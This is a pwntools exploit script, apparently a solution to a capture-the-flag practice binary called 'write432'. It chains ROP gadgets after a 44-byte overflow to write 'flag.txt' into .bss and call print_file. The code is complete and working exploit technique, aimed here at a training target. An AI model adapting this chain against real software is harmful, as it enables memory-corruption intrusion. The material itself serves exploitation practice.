#!/bin/python3

from pwn import *

context.clear(arch='i386')
filename = './write432'

elf = ELF(filename)
io = process(filename)

# gadgets
r = ROP(elf)

pop = p32(r.edi.address)
mov = p32(0x8048543)
bss = elf.bss()

# main
r.raw(cyclic(44))

# 1st write
r.raw(pop)
r.raw(p32(bss))
r.raw(b'flag')
r.raw(mov)

# 2nd write
r.raw(pop)
r.raw(p32(bss+4))
r.raw(b'.txt')
r.raw(mov)

# call print_file
r.call('print_file', [bss])

payload = r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))